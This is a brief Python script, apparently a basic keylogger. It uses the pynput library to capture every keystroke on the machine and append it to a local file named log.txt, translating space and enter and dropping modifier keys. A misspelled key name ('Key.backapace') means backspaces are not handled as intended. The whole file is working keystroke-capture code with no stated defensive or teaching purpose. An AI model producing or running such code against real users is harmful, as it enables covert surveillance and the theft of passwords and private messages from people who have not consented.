from pynput.keyboard import Listener
def writetofile(key):
    keydata=str(key)
    keydata=keydata.replace("'","")
    if keydata == 'Key.space':
        keydata = ' '
    if keydata == 'Key.shift':
        keydata = ''
    if keydata == "Key.ctrl":
        keydata = ""
    if keydata == "Key.cmd":
        keydata = ""
    if keydata == "Key.alt":
        keydata = ""
    if keydata == "Key.enter":
        keydata = "\n"
    if keydata == "Key.backapace":
        keydata = ""
    with open("log.txt",'a') as f:
        f.write(keydata) 

with Listener(on_press=writetofile) as l:
    l.join() 